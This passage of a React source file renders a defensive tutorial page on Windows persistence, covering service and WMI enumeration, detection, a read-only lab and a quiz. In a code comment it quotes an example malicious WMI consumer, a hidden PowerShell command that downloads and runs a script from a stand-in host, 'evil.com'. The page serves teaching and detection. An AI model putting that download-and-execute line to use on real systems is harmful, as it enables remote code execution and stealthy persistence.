                    </Paper>
                  </Grid>
                </Grid>
                <CodeBlock language="powershell" code={`# List all services and their binaries
Get-WmiObject win32_service | Select-Object Name, DisplayName, PathName, StartMode, State, StartName | Format-Table -AutoSize

# Find suspicious service paths (user-writable locations)
Get-WmiObject win32_service | Where-Object {
  $_.PathName -like "*Temp*" -or
  $_.PathName -like "*AppData*" -or
  $_.PathName -like "*Users\\*"
} | Select-Object Name, PathName, StartMode

# Check for unsigned service binaries
Get-WmiObject win32_service | ForEach-Object {
  $path = $_.PathName -replace '"', '' -split ' ')[0]
  if (Test-Path $path) {
    $sig = Get-AuthenticodeSignature $path
    if ($sig.Status -ne 'Valid') {
      [PSCustomObject]@{Service=$_.Name; Path=$path; SignatureStatus=$sig.Status}
    }
  }
}`} />
              </Paper>

              {/* Deep Dive: WMI Event Subscriptions */}
              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#8b5cf6", 0.03), borderRadius: 2 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
                  4. WMI Event Subscriptions: The Fileless Persistence
                </Typography>
                <Typography variant="body2" paragraph sx={{ color: "grey.300" }}>
                  Windows Management Instrumentation (WMI) is a powerful framework for system administration that can monitor events and
                  automatically execute actions when those events occur. APT groups like APT29 (Cozy Bear) have abused WMI persistence because
                  it's incredibly stealthy—the malicious code is stored in the WMI repository (CIM database) rather than on disk, making it
                  invisible to traditional file-based scanning.
                </Typography>
                <Typography variant="body2" paragraph sx={{ color: "grey.300" }}>
                  WMI persistence consists of three components: an <strong>EventFilter</strong> (what to watch for), a <strong>Consumer</strong> (what
                  to do), and a <strong>FilterToConsumerBinding</strong> (connecting the two). For example, an EventFilter might watch for user logon,
                  and the Consumer might execute a PowerShell payload stored in the WMI repository itself.
                </Typography>
                <Grid container spacing={2} sx={{ mb: 2 }}>
                  <Grid item xs={12} md={4}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2, textAlign: "center" }}>
                      <Typography variant="subtitle2" sx={{ color: "#8b5cf6", fontWeight: 700, mb: 1 }}>
                        1️⃣ EventFilter
                      </Typography>
                      <Typography variant="caption" sx={{ color: "grey.400" }}>
                        Defines WHAT event to monitor (e.g., "User logs in", "Process starts", "File created")
                      </Typography>
                    </Paper>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, textAlign: "center" }}>
                      <Typography variant="subtitle2" sx={{ color: "#22c55e", fontWeight: 700, mb: 1 }}>
                        2️⃣ Consumer
                      </Typography>
                      <Typography variant="caption" sx={{ color: "grey.400" }}>
                        Defines WHAT ACTION to take (CommandLine, ActiveScript, or LogFile consumer)
                      </Typography>
                    </Paper>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 2, textAlign: "center" }}>
                      <Typography variant="subtitle2" sx={{ color: "#f59e0b", fontWeight: 700, mb: 1 }}>
                        3️⃣ Binding
                      </Typography>
                      <Typography variant="caption" sx={{ color: "grey.400" }}>
                        Connects Filter to Consumer to create the active subscription
                      </Typography>
                    </Paper>
                  </Grid>
                </Grid>
                <Alert severity="error" sx={{ mb: 2 }}>
                  <Typography variant="body2">
                    <strong>Why WMI Persistence is Dangerous:</strong> It's fileless (stored in WMI repository), persists across reboots, runs with SYSTEM
                    privileges, and requires specialized tools to detect. Traditional antivirus won't find it because there's no file on disk to scan.
                  </Typography>
                </Alert>
                <CodeBlock language="powershell" code={`# Enumerate WMI event subscriptions (detection)
Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Select-Object Name, Query
Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer | Select-Object Name, CommandLineTemplate
Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding

# Example malicious WMI subscription structure:
# Filter: SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 30
# Consumer: powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
# Binding: Links the filter to the consumer`} />
              </Paper>

              <Grid container spacing={2}>
                {persistenceCategories.map((item) => (
                  <Grid item xs={12} md={6} key={item.title}>
                    <Paper
                      sx={{
                        p: 2,
                        bgcolor: theme.bgNested,
                        borderRadius: 2,
                        border: `1px solid ${alpha(theme.primary, 0.2)}`,
                        height: "100%",
                      }}
                    >
                      <Typography variant="subtitle1" sx={{ color: theme.text, fontWeight: 600 }}>
                        {item.title}
                      </Typography>
                      <Typography variant="body2" sx={{ color: "grey.400", mb: 1 }}>
                        {item.desc}
                      </Typography>
                      <Typography variant="caption" sx={{ color: "grey.500" }}>
                        Example: {item.examples}
                      </Typography>
                    </Paper>
                  </Grid>
                ))}
              </Grid>

              <Paper sx={{ p: 2.5, mt: 3, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
                <Typography variant="h6" sx={{ color: theme.primary, mb: 1 }}>
                  MITRE ATT&CK Mapping (High Level)
                </Typography>
                <TableContainer>
                  <Table size="small">
                    <TableHead>
                      <TableRow>
                        <TableCell sx={{ color: "#3b82f6" }}>Technique</TableCell>
                        <TableCell sx={{ color: "#3b82f6" }}>Name</TableCell>
                        <TableCell sx={{ color: "#3b82f6" }}>Examples</TableCell>
                      </TableRow>
                    </TableHead>
                    <TableBody>
                      {attckMappings.map((item) => (
                        <TableRow key={item.technique}>
                          <TableCell sx={{ color: "grey.200", fontWeight: 600 }}>{item.technique}</TableCell>
                          <TableCell sx={{ color: "grey.300" }}>{item.name}</TableCell>
                          <TableCell sx={{ color: "grey.400" }}>{item.examples}</TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                </TableContainer>
              </Paper>

              <Paper sx={{ p: 2.5, bgcolor: theme.bgNested, borderRadius: 2 }}>
                <Typography variant="h6" sx={{ color: theme.secondary, mb: 1 }}>
                  Category Selection Tips
                </Typography>
                <List dense>
                  {[
                    "Start with user logon triggers (Run keys, Startup folder) for quick wins.",
                    "Prioritize scheduled tasks and services for SYSTEM level persistence.",
                    "Check WMI and GPO if you suspect stealth or broad deployment.",
                    "Look for DLL hijacks when binaries run from unusual directories.",
                  ].map((item) => (
                    <ListItem key={item}>
                      <ListItemIcon>
                        <CheckCircleIcon color="info" fontSize="small" />
                      </ListItemIcon>
                      <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "grey.300" } }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>
          </Paper>
        </Box>

        {/* Section: Common Locations */}
        <Box id="common-locations" sx={{ mt: 4, scrollMarginTop: 80 }}>
          <Paper elevation={0} sx={{ bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${theme.border}`, overflow: "hidden", p: 3 }}>
            <Box sx={{ mb: 3 }}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                <SearchIcon sx={{ color: theme.warning }} />
                <Typography variant="h5" sx={{ fontWeight: 700, background: `linear-gradient(135deg, ${theme.warning} 0%, ${theme.primary} 100%)`, backgroundClip: "text", WebkitBackgroundClip: "text", color: "transparent" }}>
                  Common Locations
                </Typography>
              </Box>
              <Divider sx={{ mt: 2, borderColor: theme.border }} />
            </Box>

              <TableContainer sx={{ mb: 3 }}>
                <Table size="small">
                  <TableHead>
                    <TableRow>
                      <TableCell sx={{ color: theme.primary }}>Location</TableCell>
                      <TableCell sx={{ color: theme.primary }}>Purpose</TableCell>
                      <TableCell sx={{ color: theme.primary }}>Red Flag Signal</TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {commonLocations.map((item) => (
                      <TableRow key={item.location}>
                        <TableCell sx={{ color: "grey.200", fontWeight: 600 }}>{item.location}</TableCell>
                        <TableCell sx={{ color: "grey.400" }}>{item.purpose}</TableCell>
                        <TableCell sx={{ color: "grey.400" }}>{item.signal}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>

              <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
                <Typography variant="h6" sx={{ color: theme.primary, mb: 1 }}>
                  Triage Prompts
                </Typography>
                <List dense>
                  {triagePrompts.map((item) => (
                    <ListItem key={item}>
                      <ListItemIcon>
                        <CheckCircleIcon color="info" fontSize="small" />
                      </ListItemIcon>
                      <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "grey.300" } }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>

              <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
                <Typography variant="h6" sx={{ color: theme.secondary, mb: 1 }}>
                  Path Risk Guide
                </Typography>
                <TableContainer>
                  <Table size="small">
                    <TableHead>
                      <TableRow>
                        <TableCell sx={{ color: theme.primary }}>Location</TableCell>
                        <TableCell sx={{ color: theme.primary }}>Risk</TableCell>
                        <TableCell sx={{ color: theme.primary }}>Why it matters</TableCell>
                      </TableRow>
                    </TableHead>
                    <TableBody>
                      {pathRiskGuide.map((item) => (
                        <TableRow key={item.location}>
                          <TableCell sx={{ color: "grey.200", fontWeight: 600 }}>{item.location}</TableCell>
                          <TableCell sx={{ color: "grey.300" }}>{item.risk}</TableCell>
                          <TableCell sx={{ color: "grey.400" }}>{item.note}</TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                </TableContainer>
              </Paper>

              <Accordion sx={{ bgcolor: theme.bgNested }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                  <Typography variant="h6">Safe Enumeration Commands</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    code={`# Registry Run keys
reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"

# Scheduled tasks (read-only)
schtasks /query /fo LIST /v
Get-ScheduledTask | Select-Object TaskName, TaskPath, State

# Services (read-only)
sc query type= service state= all
Get-Service | Select-Object Name, Status, StartType

# Startup folders (read-only)
dir "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
dir "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

# WMI subscriptions (read-only)
Get-WmiObject -Namespace root\\subscription -Class __EventFilter
Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer`}
                    language="powershell"
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: theme.bgNested }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                  <Typography variant="h6">Signature and Hash Checks</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock
                    code={`# Check file signature and hash (read-only)
Get-AuthenticodeSignature "C:\\Path\\to\\binary.exe"
Get-FileHash "C:\\Path\\to\\binary.exe" -Algorithm SHA256

# Sysinternals Sigcheck (if installed)
sigcheck -q -h -i "C:\\Path\\to\\binary.exe"`}
                    language="powershell"
                  />
                </AccordionDetails>
              </Accordion>

              <Accordion sx={{ bgcolor: theme.bgNested }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                  <Typography variant="h6">Command Cheat Sheet</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <TableContainer>
                    <Table size="small">
                      <TableHead>
                        <TableRow>
                          <TableCell sx={{ color: theme.primary }}>Command</TableCell>
                          <TableCell sx={{ color: theme.primary }}>What it tells you</TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {[
                          ["reg query ...\\Run", "Lists programs that run at user logon."],
                          ["schtasks /query", "Shows scheduled tasks and triggers."],
                          ["sc query", "Lists services and their status."],
                          ["dir Startup", "Shows startup shortcuts or scripts."],
                          ["Get-WmiObject root\\subscription", "Finds WMI persistence artifacts."],
                        ].map(([cmd, desc]) => (
                          <TableRow key={cmd}>
                            <TableCell sx={{ color: "grey.200", fontFamily: "monospace" }}>{cmd}</TableCell>
                            <TableCell sx={{ color: "grey.400" }}>{desc}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                </AccordionDetails>
              </Accordion>
          </Paper>
        </Box>

        {/* Section: Detection and Logs */}
        <Box id="detection-logs" sx={{ mt: 4, scrollMarginTop: 80 }}>
          <Paper elevation={0} sx={{ bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${theme.border}`, overflow: "hidden", p: 3 }}>
            <Box sx={{ mb: 3 }}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                <BuildIcon sx={{ color: theme.success }} />
                <Typography variant="h5" sx={{ fontWeight: 700, background: `linear-gradient(135deg, ${theme.success} 0%, ${theme.primary} 100%)`, backgroundClip: "text", WebkitBackgroundClip: "text", color: "transparent" }}>
                  Detection & Logs
                </Typography>
              </Box>
              <Divider sx={{ mt: 2, borderColor: theme.border }} />
            </Box>

              <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
                <Typography variant="h6" sx={{ color: theme.primary, mb: 1 }}>
                  Detection Signals
                </Typography>
                <List dense>
                  {detectionSignals.map((item) => (
                    <ListItem key={item}>
                      <ListItemIcon>
                        <CheckCircleIcon color="info" fontSize="small" />
                      </ListItemIcon>
                      <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "grey.300" } }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>

              <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
                <Typography variant="h6" sx={{ color: theme.secondary, mb: 1 }}>
                  Correlation Ideas
                </Typography>
                <List dense>
                  {correlationIdeas.map((item) => (
                    <ListItem key={item}>
                      <ListItemIcon>
                        <CheckCircleIcon color="success" fontSize="small" />
                      </ListItemIcon>
                      <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "grey.300" } }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>

              <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
                <Typography variant="h6" sx={{ color: theme.secondary, mb: 1 }}>
                  Useful Windows Event IDs
                </Typography>
                <List dense>
                  {eventIds.map((item) => (
                    <ListItem key={item}>
                      <ListItemIcon>
                        <CheckCircleIcon color="success" fontSize="small" />
                      </ListItemIcon>
                      <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "grey.300" } }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>

              <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
                <Typography variant="h6" sx={{ color: theme.primary, mb: 1 }}>
                  Response Checklist
                </Typography>
                <List dense>
                  {responseChecklist.map((item) => (
                    <ListItem key={item}>
                      <ListItemIcon>
                        <CheckCircleIcon color="info" fontSize="small" />
                      </ListItemIcon>
                      <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "grey.300" } }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>

              <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
                <Typography variant="h6" sx={{ color: theme.primary, mb: 1 }}>
                  Hardening Checklist
                </Typography>
                <List dense>
                  {hardeningChecklist.map((item) => (
                    <ListItem key={item}>
                      <ListItemIcon>
                        <CheckCircleIcon color="info" fontSize="small" />
                      </ListItemIcon>
                      <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "grey.300" } }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>

              <Paper sx={{ p: 2.5, bgcolor: theme.bgNested, borderRadius: 2 }}>
                <Typography variant="h6" sx={{ color: theme.secondary, mb: 1 }}>
                  Evidence Checklist
                </Typography>
                <List dense>
                  {evidenceChecklist.map((item) => (
                    <ListItem key={item}>
                      <ListItemIcon>
                        <CheckCircleIcon color="info" fontSize="small" />
                      </ListItemIcon>
                      <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "grey.300" } }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>
          </Paper>
        </Box>

        {/* Section: Beginner Lab */}
        <Box id="beginner-lab" sx={{ mt: 4, scrollMarginTop: 80 }}>
          <Paper elevation={0} sx={{ bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${theme.border}`, overflow: "hidden", p: 3 }}>
            <Box sx={{ mb: 3 }}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                <SchoolIcon sx={{ color: theme.accent }} />
                <Typography variant="h5" sx={{ fontWeight: 700, background: `linear-gradient(135deg, ${theme.accent} 0%, ${theme.primary} 100%)`, backgroundClip: "text", WebkitBackgroundClip: "text", color: "transparent" }}>
                  Beginner Lab
                </Typography>
              </Box>
              <Divider sx={{ mt: 2, borderColor: theme.border }} />
            </Box>

              <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
                <Typography variant="h6" sx={{ color: theme.primary, mb: 1 }}>
                  Beginner Lab Walkthrough (Read-only)
                </Typography>
                <List dense>
                  {[
                    "Use a Windows lab VM or test system you own.",
                    "Run the safe enumeration commands and save outputs.",
                    "Pick one task, one service, and one run key entry to document.",
                    "Check file paths and signatures for each item.",
                    "Write a short report with screenshots and recommendations.",
                  ].map((item) => (
                    <ListItem key={item}>
                      <ListItemIcon>
                        <CheckCircleIcon color="info" fontSize="small" />
                      </ListItemIcon>
                      <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "grey.300" } }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>

              <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
                <Typography variant="h6" sx={{ color: theme.secondary, mb: 1 }}>
                  Success Criteria
                </Typography>
                <List dense>
                  {labSuccessCriteria.map((item) => (
                    <ListItem key={item}>
                      <ListItemIcon>
                        <CheckCircleIcon color="success" fontSize="small" />
                      </ListItemIcon>
                      <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "grey.300" } }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>

              <Paper sx={{ p: 2.5, mb: 3, bgcolor: theme.bgNested, borderRadius: 2 }}>
                <Typography variant="h6" sx={{ color: theme.primary, mb: 1 }}>
                  Stretch Goals
                </Typography>
                <List dense>
                  {stretchGoals.map((item) => (
                    <ListItem key={item}>
                      <ListItemIcon>
                        <CheckCircleIcon color="info" fontSize="small" />
                      </ListItemIcon>
                      <ListItemText primary={item} sx={{ "& .MuiListItemText-primary": { color: "grey.300" } }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>

              <Accordion sx={{ bgcolor: theme.bgNested }}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                  <Typography variant="h6">Report Template</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <CodeBlock language="text" code={reportTemplate} />
                </AccordionDetails>
              </Accordion>
          </Paper>
        </Box>

        {/* Section: Knowledge Check */}
        <Box id="quiz-section" sx={{ mt: 4, scrollMarginTop: 80 }}>
          <Paper elevation={0} sx={{ bgcolor: theme.bgCard, borderRadius: 3, border: `1px solid ${alpha(QUIZ_ACCENT_COLOR, 0.2)}`, overflow: "hidden", p: 3 }}>
            <Box sx={{ mb: 3 }}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                <QuizIcon sx={{ color: QUIZ_ACCENT_COLOR }} />
                <Typography variant="h5" sx={{ fontWeight: 700, background: `linear-gradient(135deg, ${QUIZ_ACCENT_COLOR} 0%, ${theme.primaryLight} 100%)`, backgroundClip: "text", WebkitBackgroundClip: "text", color: "transparent" }}>
                  Knowledge Check
                </Typography>
              </Box>
              <Divider sx={{ mt: 2, borderColor: theme.border }} />
            </Box>

            <QuizSection
              questions={quizQuestions}
              accentColor={QUIZ_ACCENT_COLOR}
              title="Windows Persistence Knowledge Check"
              description="Random 10-question quiz drawn from a 75-question bank each time you start the quiz."
              questionsPerQuiz={QUIZ_QUESTION_COUNT}
            />
          </Paper>
        </Box>

        <Box sx={{ mt: 4, textAlign: "center" }}>
          <Button
            variant="outlined"
            startIcon={<ArrowBackIcon />}
            onClick={() => navigate("/learn")}
            sx={{ borderColor: theme.primary, color: theme.primary }}
          >
            Back to Learning Hub
          </Button>
        </Box>
        </Grid>
        </Grid>
      </Container>

      {/* Mobile Navigation Drawer */}
      <Drawer
        anchor="left"
        open={navDrawerOpen}
        onClose={() => setNavDrawerOpen(false)}
        sx={{ display: { xs: "block", md: "none" } }}
        PaperProps={{ sx: { bgcolor: theme.bgCard, width: 280 } }}
      >
        <Box sx={{ p: 2, borderBottom: `1px solid ${theme.border}` }}>
          <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
            <Typography variant="h6" sx={{ color: theme.primary, fontWeight: 700 }}>
              Navigation
            </Typography>
            <IconButton onClick={() => setNavDrawerOpen(false)} sx={{ color: "grey.400" }}>
              <CloseIcon />
            </IconButton>
          </Box>
        </Box>
        {sidebarNav}
      </Drawer>

      {/* Mobile FABs */}
      {isMobile && (
        <>
          <Fab
            size="small"
            onClick={() => setNavDrawerOpen(true)}
            sx={{ position: "fixed", bottom: 80, right: 16, bgcolor: theme.primary, color: "white", "&:hover": { bgcolor: theme.primaryLight } }}
          >
            <ListAltIcon />
          </Fab>
          <Fab
            size="small"
            onClick={() => window.scrollTo({ top: 0, behavior: "smooth" })}
            sx={{ position: "fixed", bottom: 24, right: 16, bgcolor: alpha(theme.primary, 0.8), color: "white", "&:hover": { bgcolor: theme.primary } }}
          >
            <KeyboardArrowUpIcon />
          </Fab>
        </>
      )}
    </Box>
    </LearnPageLayout>
  );
};

export default WindowsPersistenceMechanismsPage;
